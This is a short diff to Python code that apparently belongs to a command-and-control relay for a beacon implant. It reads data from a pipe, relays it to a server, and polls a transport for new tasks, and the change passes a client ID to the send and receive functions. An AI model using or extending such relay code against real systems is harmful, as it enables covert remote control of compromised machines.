@@ -120,12 +120,12 @@ def interact(handle_beacon):
                 print "Received %d bytes from pipe" % (len(chunk))
             print "relaying chunk to server"
             resp_frame = [CLIENT_ID, task_encode(chunk)]
-            sendData(resp_frame)
+            sendData(CLIENT_ID, resp_frame)
 
             # LOGIC TO CHECK FOR A NEW TASK
             print "Checking for new tasks from transport"
             
-            newTask = recvData()
+            newTask = recvData(CLIENT_ID)
 
             newTask_frame = [newTask[0], task_decode(newTask[1])]
 
